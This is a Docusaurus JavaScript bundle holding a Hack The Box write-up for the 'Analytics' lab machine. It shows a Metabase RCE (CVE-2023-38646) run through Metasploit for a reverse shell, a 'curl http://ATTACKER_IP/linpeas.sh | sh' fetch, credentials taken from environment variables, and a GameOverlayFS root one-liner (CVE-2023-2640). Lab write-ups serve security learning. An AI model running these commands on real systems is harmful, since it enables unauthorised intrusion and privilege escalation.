"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7203],{37350:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var t=s(74848),i=s(28453);const a={},r="Analytics",c={id:"writeups/htb/analytics/index",title:"Analytics",description:"A writeup for the machine Analytics on Hack The Box.",source:"@site/docs/writeups/htb/analytics/index.md",sourceDirName:"writeups/htb/analytics",slug:"/writeups/htb/analytics/",permalink:"/docs/writeups/htb/analytics/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/analytics/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"About",permalink:"/docs/writeups/"},next:{title:"MetaTwo",permalink:"/docs/writeups/htb/metatwo/"}},o={},l=[{value:"Footprinting",id:"footprinting",level:2},{value:"Nmap scans",id:"nmap-scans",level:3},{value:"Web server",id:"web-server",level:3},{value:"User flag",id:"user-flag",level:2},{value:"Exploiting Metabase",id:"exploiting-metabase",level:3},{value:"From metabase to user",id:"from-metabase-to-user",level:3},{value:"Accessing with SSH",id:"accessing-with-ssh",level:3},{value:"Root flag",id:"root-flag",level:2},{value:"Enumerating the environment",id:"enumerating-the-environment",level:3},{value:"Exploiting CVE-2023-2640",id:"exploiting-cve-2023-2640",level:3}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,i.R)(),...e.components},{Image:a}=n;return a||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"analytics",children:"Analytics"}),"\n",(0,t.jsxs)(n.p,{children:["A writeup for the machine ",(0,t.jsx)(n.a,{href:"https://app.hackthebox.com/machines/Analytics",children:"Analytics"})," on Hack The Box."]}),"\n",(0,t.jsx)(a,{src:s(53553).A,width:"700"}),"\n",(0,t.jsx)(n.h2,{id:"footprinting",children:"Footprinting"}),"\n",(0,t.jsx)(n.h3,{id:"nmap-scans",children:"Nmap scans"}),"\n",(0,t.jsx)(n.p,{children:"Firstly, we can start with a nmap scan."}),"\n",(0,t.jsx)(n.p,{children:"We find two open ports with one web servers publicly accessible."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"nmap -sS <HOST>\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"22 -> SSH\n80 -> HTTP\n"})}),"\n",(0,t.jsx)(a,{src:s(3271).A}),"\n",(0,t.jsx)(n.h3,{id:"web-server",children:"Web server"}),"\n",(0,t.jsxs)(n.p,{children:["To access the web server, we need to update the ",(0,t.jsx)(n.code,{children:"/etc/hosts"})," file with the machine IP."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:'echo "10.10.11.233 analytics.htb" >> /etc/hosts\n'})}),"\n",(0,t.jsx)(n.p,{children:"The web server is running a simple website with an home page and a login page."}),"\n",(0,t.jsx)(a,{src:s(76935).A}),"\n",(0,t.jsxs)(n.p,{children:["If we try to open the login page we are redirected to a new subdomain ",(0,t.jsx)(n.code,{children:"data.analytics.htb"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"After updating again the hosts file, we can access the login page."}),"\n",(0,t.jsxs)(n.p,{children:["The login page is running a ",(0,t.jsx)(n.code,{children:"Metabase"})," instance, an open-source web analytics platform."]}),"\n",(0,t.jsx)(a,{src:s(89092).A}),"\n",(0,t.jsx)(n.h2,{id:"user-flag",children:"User flag"}),"\n",(0,t.jsx)(n.h3,{id:"exploiting-metabase",children:"Exploiting Metabase"}),"\n",(0,t.jsx)(n.p,{children:"If we look to the source code of the login page, we can find some interesting information of the service."}),"\n",(0,t.jsxs)(n.p,{children:["One of the details contains the version of the ",(0,t.jsx)(n.code,{children:"Metabase"})," instance."]}),"\n",(0,t.jsx)(a,{src:s(6264).A}),"\n",(0,t.jsx)(n.p,{children:"By searching online for this specifc version, we can find a RCE vulnerability and an Metasploit exploit for it."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://nvd.nist.gov/vuln/detail/CVE-2023-38646",children:"https://nvd.nist.gov/vuln/detail/CVE-2023-38646"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://packetstormsecurity.com/files/174091/Metabase-Remote-Code-Execution.html",children:"https://packetstormsecurity.com/files/174091/Metabase-Remote-Code-Execution.html"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"msfconsole\nuse exploit/multi/http/metabase_unauth_rce\nset RHOSTS data.analytics.htb\nset RPORT 80\nset LHOST ATTACKER_IP\nrun\n"})}),"\n",(0,t.jsxs)(n.p,{children:["After running the exploit, we can get a reverse shell as the ",(0,t.jsx)(n.code,{children:"metabase"})," user."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"whoami\n"})}),"\n",(0,t.jsx)(a,{src:s(61236).A}),"\n",(0,t.jsx)(n.h3,{id:"from-metabase-to-user",children:"From metabase to user"}),"\n",(0,t.jsx)(n.p,{children:"Once inside the machine, we discover that we are in a docker container."}),"\n",(0,t.jsx)(n.p,{children:"We can still try to find some interesting information to escalate our privileges."}),"\n",(0,t.jsxs)(n.p,{children:["One possible way is to run ",(0,t.jsx)(n.code,{children:"linpeas"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# attacker\npython3 -m http.server 80\n# target\ncurl http://ATTACKER_IP/linpeas.sh | sh\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Inside the environment variables, we can find a username and a password for the ",(0,t.jsx)(n.code,{children:"metalytics"})," user."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"echo $META_USER\necho $META_PASS\n"})}),"\n",(0,t.jsx)(a,{src:s(54667).A}),"\n",(0,t.jsx)(n.h3,{id:"accessing-with-ssh",children:"Accessing with SSH"}),"\n",(0,t.jsx)(n.p,{children:"We can use the credentials that we found in the previous step to login via SSH."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"ssh metalytics@TARGET_IP\n"})}),"\n",(0,t.jsx)(n.p,{children:"After logging in, we can find the user flag inside the home directory."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"cat user.txt\n"})}),"\n",(0,t.jsx)(a,{src:s(87695).A}),"\n",(0,t.jsx)(n.h2,{id:"root-flag",children:"Root flag"}),"\n",(0,t.jsx)(n.h3,{id:"enumerating-the-environment",children:"Enumerating the environment"}),"\n",(0,t.jsx)(n.p,{children:"Now that we are inside the system, we can start to look for a way to escalate our privileges."}),"\n",(0,t.jsx)(n.p,{children:"Nothing interesting is found in the home directory or in the user's history."}),"\n",(0,t.jsxs)(n.p,{children:["We can again use ",(0,t.jsx)(n.code,{children:"linpeas"})," to find additional information."]}),"\n",(0,t.jsx)(n.p,{children:"As before, we can serve the script on our local machine and download it on the target."}),"\n",(0,t.jsx)(n.p,{children:"Even in this case, nothing interesting is found."}),"\n",(0,t.jsx)(n.h3,{id:"exploiting-cve-2023-2640",children:"Exploiting CVE-2023-2640"}),"\n",(0,t.jsx)(n.p,{children:"Because we didn't find anything useful, we can start looking for possible vulnerabilities in the system."}),"\n",(0,t.jsx)(n.p,{children:"To do so, we can start by checking the version of the operating system."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"cat /etc/os-release\n"})}),"\n",(0,t.jsx)(a,{src:s(73233).A}),"\n",(0,t.jsx)(n.p,{children:"By searching online we can see that this version is vulnerable to the OverlayFS vulnerability."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://nvd.nist.gov/vuln/detail/CVE-2023-2640",children:"https://nvd.nist.gov/vuln/detail/CVE-2023-2640"})}),"\n",(0,t.jsx)(n.p,{children:"A simple exploit can allow us to run commands as root."}),"\n",(0,t.jsx)(n.p,{children:"It is enough to execute the following command to get the root flag."}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://github.com/luanoliveira350/GameOverlayFS/blob/main/gameoverlay.sh",children:"https://github.com/luanoliveira350/GameOverlayFS/blob/main/gameoverlay.sh"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/\nsetcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c \'import os;os.setuid(0);os.system("ls /root")\'\n'})}),"\n",(0,t.jsx)(n.p,{children:"Be careful, it should be run as a single command or run it through a script."}),"\n",(0,t.jsx)(a,{src:s(63219).A})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},53553:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/banner-ce592ac6590533d57ad996b3e0a84e91.png"},54667:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/env-vars-971e79839eb1fc01f34a2a699b29c14b.png"},76935:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/homepage-8e8537fdf7735565febfc68f5159af0b.png"},89092:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/login-835a93ddc25d197c7cdd56ad7cf38979.png"},6264:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/metabase-version-8d4534c2467664c2b14f32ecbc08cc41.png"},3271:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/nmap-213a5d9b858df9fc5a13f3b298406275.png"},61236:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/reverse-shell-ed19648999d41d3f33ea1734cf5961cb.png"},63219:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/root-15303964deae4aa0445be3c9f6625b61.png"},73233:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/ubuntu-version-76b2b1d296d29bcb9a1af1a663b31c15.png"},87695:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/user-flag-779e104cb201a470447588632bc5083f.png"},28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>c});var t=s(96540);const i={},a=t.createContext(i);function r(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);